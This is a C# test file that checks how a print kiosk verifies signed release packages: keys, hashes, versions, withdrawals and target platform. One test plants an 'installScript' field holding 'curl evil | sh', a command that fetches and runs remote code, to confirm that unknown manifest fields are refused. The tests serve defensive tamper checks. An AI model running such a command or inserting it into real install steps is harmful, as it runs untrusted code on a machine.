using System.Security.Cryptography;
using System.Text;

using NeoPrint.Crypto.Releases;
using NeoPrint.Kiosk.Core.Updates;

namespace NeoPrint.Kiosk.Tests;

/// <summary>
/// A kiosk installs a release package only when it is signed with one of its
/// two release keys, is exactly the file the manifest names, and is newer than
/// what it has and not withdrawn (T-313, docs/RELEASE_SIGNING.md).
/// </summary>
public sealed class ReleasePackageCheckTests : IDisposable
{
    private readonly ECDsa _current = ECDsa.Create(ECCurve.NamedCurves.nistP256);
    private readonly ECDsa _next = ECDsa.Create(ECCurve.NamedCurves.nistP256);
    private readonly ECDsa _stranger = ECDsa.Create(ECCurve.NamedCurves.nistP256);
    private readonly string _dir = Directory.CreateTempSubdirectory("neoprint-release-").FullName;

    private static readonly ReleaseExpectation OnA040LinuxKiosk = new(
        ReleaseComponent.App, "linux-x64", ReleaseVersion.Parse("0.4.0"), ReleaseVersion.Parse("0.4.0"), []);

    public void Dispose()
    {
        _current.Dispose();
        _next.Dispose();
        _stranger.Dispose();
        Directory.Delete(_dir, recursive: true);
    }

    private ReleasePackageCheck Kiosk() =>
        new([ReleasePublicKey.FromKey(_current), ReleasePublicKey.FromKey(_next)]);

    [Fact]
    public async Task A_package_signed_with_the_current_key_is_installed()
    {
        var release = Release();
        release.Sign(_current);

        var check = await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk);

        check.Accepted.Should().BeTrue(check.Detail);
        check.Manifest!.Version.Should().Be(ReleaseVersion.Parse("0.5.0"));
    }

    [Fact]
    public async Task After_a_rotation_a_package_signed_with_the_next_key_is_installed_by_the_same_build()
    {
        var release = Release();
        release.Sign(_next);

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Accepted.Should().BeTrue();
    }

    [Fact]
    public async Task A_package_signed_with_a_key_the_kiosk_does_not_carry_is_refused()
    {
        var release = Release();
        release.Sign(_stranger);

        var check = await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk);

        check.Rejection.Should().Be(ReleaseRejection.UnknownKey);
    }

    [Fact]
    public async Task A_signature_that_names_a_trusted_key_but_was_made_with_another_is_refused()
    {
        var release = Release();
        var forged = ReleaseSignature.Sign(_stranger, File.ReadAllBytes(release.Manifest));
        File.WriteAllBytes(release.Signature, (forged with { KeyId = ReleasePublicKey.FromKey(_current).KeyId }).ToBytes());

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.BadSignature);
    }

    [Fact]
    public async Task A_changed_package_is_refused_even_with_its_original_signed_manifest()
    {
        var release = Release();
        release.Sign(_current);

        // One byte flipped: the same size, another SHA-256.
        var bytes = File.ReadAllBytes(release.Package);
        bytes[100] ^= 0x01;
        File.WriteAllBytes(release.Package, bytes);

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.PackageMismatch);

        // Something appended.
        File.WriteAllBytes(release.Package, [.. release.PackageBytes, 0x00]);
        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.PackageMismatch);
    }

    [Fact]
    public async Task A_manifest_changed_after_signing_to_fit_a_changed_package_is_refused()
    {
        var release = Release();
        release.Sign(_current);

        var evil = Encoding.UTF8.GetBytes("a build that is not ours" + new string('x', 4000));
        File.WriteAllBytes(release.Package, evil);
        var manifest = ReleaseManifest.Parse(File.ReadAllBytes(release.Manifest)) with
        {
            Size = evil.Length,
            Sha256 = Convert.ToHexString(SHA256.HashData(evil)).ToLowerInvariant(),
        };
        File.WriteAllBytes(release.Manifest, manifest.ToBytes());

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.BadSignature);
    }

    [Theory]
    [InlineData("0.4.0")] // the installed one again
    [InlineData("0.3.9")] // an older one played back
    [InlineData("0.4.0-pilot.3")] // the pilot build before the installed release
    public async Task A_package_that_is_not_newer_than_the_installed_one_is_refused(string version)
    {
        var release = Release(version: version);
        release.Sign(_current);

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.NotNewer);
    }

    [Fact]
    public async Task A_withdrawn_package_is_refused_though_its_signature_is_good()
    {
        var release = Release();
        release.Sign(_current);
        var withdrawn = OnA040LinuxKiosk with { Withdrawn = [Convert.ToHexString(SHA256.HashData(release.PackageBytes)).ToLowerInvariant()] };

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, withdrawn))
            .Rejection.Should().Be(ReleaseRejection.Withdrawn);
    }

    [Fact]
    public async Task A_package_for_another_platform_or_component_is_refused()
    {
        var windows = Release(platform: "win-x64");
        windows.Sign(_current);
        (await Kiosk().CheckAsync(windows.Manifest, windows.Signature, windows.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.WrongTarget);

        var agent = Release(component: ReleaseComponent.Agent);
        agent.Sign(_current);
        (await Kiosk().CheckAsync(agent.Manifest, agent.Signature, agent.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.WrongTarget);
    }

    [Fact]
    public async Task A_package_that_needs_a_newer_agent_waits_for_the_agent()
    {
        var release = Release(minAgentVersion: "0.5.0");
        release.Sign(_current);

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.AgentTooOld);
    }

    [Fact]
    public async Task A_signed_manifest_with_a_field_this_build_does_not_know_is_refused()
    {
        var release = Release();
        var text = File.ReadAllText(release.Manifest).Replace("\"schema\": 1,", "\"schema\": 1,\n  \"installScript\": \"curl evil | sh\",", StringComparison.Ordinal);
        File.WriteAllText(release.Manifest, text);
        release.Sign(_current);

        (await Kiosk().CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.MalformedManifest);
    }

    [Fact]
    public async Task A_build_that_trusts_no_key_installs_nothing()
    {
        var release = Release();
        release.Sign(_current);

        (await new ReleasePackageCheck([]).CheckAsync(release.Manifest, release.Signature, release.Package, OnA040LinuxKiosk))
            .Rejection.Should().Be(ReleaseRejection.UnknownKey);
    }

    [Fact]
    public void A_kiosk_carries_two_public_keys_at_most()
    {
        using var third = ECDsa.Create(ECCurve.NamedCurves.nistP256);

        var act = () => new ReleasePackageCheck([ReleasePublicKey.FromKey(_current), ReleasePublicKey.FromKey(_next), ReleasePublicKey.FromKey(third)]);

        act.Should().Throw<ArgumentException>();
    }

    [Fact]
    public void The_compiled_in_keys_are_at_most_two_distinct_P256_public_keys()
    {
        ReleaseKeys.Trusted.Should().HaveCountLessThanOrEqualTo(2);
        ReleaseKeys.Trusted.Select(k => k.KeyId).Should().OnlyHaveUniqueItems();
        (ReleaseKeys.Current + ReleaseKeys.Next).Should().NotContainEquivalentOf("PRIVATE", "a private key never goes into a build");
        _ = new ReleasePackageCheck();
    }

    [Fact]
    public void A_private_key_or_another_curve_is_not_taken_for_a_release_key()
    {
        var privatePem = _current.ExportPkcs8PrivateKeyPem();
        ((Action)(() => ReleasePublicKey.FromPem(privatePem))).Should().Throw<ArgumentException>();

        using var p384 = ECDsa.Create(ECCurve.NamedCurves.nistP384);
        ((Action)(() => ReleasePublicKey.FromPem(p384.ExportSubjectPublicKeyInfoPem()))).Should().Throw<ArgumentException>();
    }

    [Theory]
    [InlineData("0.4.0", "0.4.1")]
    [InlineData("0.4.9", "0.10.0")]
    [InlineData("1.0.0-pilot.2", "1.0.0-pilot.10")]
    [InlineData("1.0.0-pilot.10", "1.0.0")]
    [InlineData("1.0.0-alpha", "1.0.0-alpha.1")]
    public void Versions_are_ordered_as_SemVer_orders_them(string older, string newer)
    {
        (ReleaseVersion.Parse(older) < ReleaseVersion.Parse(newer)).Should().BeTrue();
    }

    [Theory]
    [InlineData("1.0")]
    [InlineData("01.0.0")]
    [InlineData("1.0.0+build.5")]
    [InlineData("v1.0.0")]
    public void A_version_that_is_not_plain_SemVer_is_refused(string text)
    {
        ReleaseVersion.TryParse(text, out _).Should().BeFalse();
    }

    private TestRelease Release(
        string version = "0.5.0",
        string platform = "linux-x64",
        ReleaseComponent component = ReleaseComponent.App,
        string minAgentVersion = "0.4.0")
    {
        var package = new byte[4096];
        new Random(313).NextBytes(package);
        var name = $"neoprint-kiosk-app-{version}-{platform}.tar.gz";
        var manifest = new ReleaseManifest(component, platform, ReleaseVersion.Parse(version), ReleaseVersion.Parse(minAgentVersion),
            name, package.Length, Convert.ToHexString(SHA256.HashData(package)).ToLowerInvariant(), "61b4baf",
            new DateTimeOffset(2026, 10, 24, 12, 0, 0, TimeSpan.Zero));

        var dir = Directory.CreateDirectory(Path.Combine(_dir, Guid.NewGuid().ToString("N"))).FullName;
        var release = new TestRelease(Path.Combine(dir, "manifest.json"), Path.Combine(dir, "manifest.json.sig"), Path.Combine(dir, name), package);
        File.WriteAllBytes(release.Manifest, manifest.ToBytes());
        File.WriteAllBytes(release.Package, package);
        return release;
    }

    private sealed record TestRelease(string Manifest, string Signature, string Package, byte[] PackageBytes)
    {
        public void Sign(ECDsa key) =>
            File.WriteAllBytes(Signature, ReleaseSignature.Sign(key, File.ReadAllBytes(Manifest)).ToBytes());
    }
}
